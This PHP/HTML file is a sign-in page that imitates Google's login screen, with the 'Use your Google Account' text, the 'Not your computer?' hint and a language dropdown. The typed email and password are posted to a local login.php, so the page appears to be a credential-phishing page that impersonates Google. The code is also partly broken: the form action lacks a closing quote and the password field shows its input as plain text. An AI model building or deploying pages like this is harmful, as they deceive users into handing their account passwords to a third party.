<?php
    session_save_path(dirname('__FILE__').'/session');
    session_start();
    require './issetSignin.php';
    if(isset($_SESSION['loginState']) == 1) {
        header('Location:home.php');
    }
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>Document</title>
    <link rel="stylesheet" href="style.css">
    <style>

</style>
</head>
<body>
        <div class="box">
	    <center><img src="R.png"  style="width:73px;height:24px;"></center><br>
                <h2>Sign in</h2>
                <p>Use your Google Account</p>
                <form action="login.php method="POST">
                  <div class="inputBox">
                    <input type="email" name="email" required onkeyup="this.setAttribute('value', this.value);"  value="">
                    <label>Username</label>
                  </div>
                  <div class="inputBox">
                        <input type="text" name="text" required onkeyup="this.setAttribute('value', this.value);" value="">
                        <label>Password</label>
                      </div>
			<p2>Not your computer? Use a private browsing window to sign in.</p2><br><br>
                  <input type="submit" name="sign-in" value="Sign In">
<br><br>
                </form>

              </div>

	<form>
	
<div class="dropup">
  <button class="dropbtn" align="center">English (United States)</button>
  <div class="dropup-content">
    <a href="#">Link 1</a>
    <a href="#">Link 2</a>
    <a href="#">Link 3</a>
  </div>
</div>
</form>
	

</body>
</html>